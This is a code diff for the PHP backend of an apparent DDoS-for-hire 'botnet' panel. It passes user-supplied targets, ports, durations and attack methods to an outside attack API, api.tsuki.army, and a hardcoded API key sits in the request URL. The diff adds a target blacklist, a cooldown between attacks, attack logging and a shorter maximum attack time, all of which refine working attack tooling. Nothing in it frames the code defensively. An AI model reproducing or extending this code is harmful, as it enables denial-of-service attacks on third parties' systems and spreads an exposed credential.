@@ -7,6 +7,7 @@
     }
 
     require "inc/main_funcs.php";
+    require "inc/sql_connect.php";
     require "inc/sql_funcs.php";
 
     function botnet_api_error($message)
@@ -23,12 +24,27 @@
         $time = filter_var($_POST['enter_time'], FILTER_VALIDATE_INT);
         $method = filter_var($_POST['attackMethod'], FILTER_SANITIZE_STRING);
 
+        // Sprawdza kurwa blackliste
+        $blacklistedUsers = fetchRecords($conn, "botnet_blacklist", "target", $target);
+        if (!empty($blacklistedUsers)) {
+            $_SESSION['error_style'] = 0;
+            $_SESSION['error_message'] = "This target is blacklisted.";
+            header('Location: botnet.php');
+            exit();
+        }
+
+        // Attack delay
+        if($_SESSION['last_boot'] + 80 > time() && $_SESSION['admin'] <= 0) {
+            $wait_time = $_SESSION['last_boot'] + 80 - time();
+            botnet_api_error("You have delay for ".$wait_time." seconds");
+        }
+
         // Port and Time validation
         if ($port === false || $port < 1 || $port > 65535) {
             botnet_api_error("Invalid port number (1-65535)");
         }
-        if ($time === false || $time < 1 || $time > 120) {
-            botnet_api_error("Invalid attack duration (1-120 seconds)");
+        if ($time === false || $time < 1 || $time > 60) {
+            botnet_api_error("Invalid attack duration (1-60 seconds)");
         }
 
         $url = "https://api.tsuki.army/v2/start?api_key=tsuki-army-nyaadhhd&user=6643&target=".$target."&time=".$time."&method=".$method."&port=".$port."";
@@ -51,14 +67,27 @@
             $ret_data = $api_data['message'];
 
             if($status) {
+                // Logs
+                $logsData = [
+                    'user' => $_SESSION['username'],
+                    'target' => $target,
+                    'port' => $port,
+                    'time' => $time,
+                    'method' => $method,
+                    'date' => time()
+                ];
+                addNewRecord($conn, 'botnet_logs', $logsData);
+
+                $_SESSION['last_boot'] = time();
+
                 $_SESSION['error_style'] = 1;
                 $_SESSION['error_message'] = $ret_data;
                 header('Location: botnet.php');
+
                 exit;
             } else {
                 botnet_api_error($ret_data);
             }
         }
-
     }
 ?>
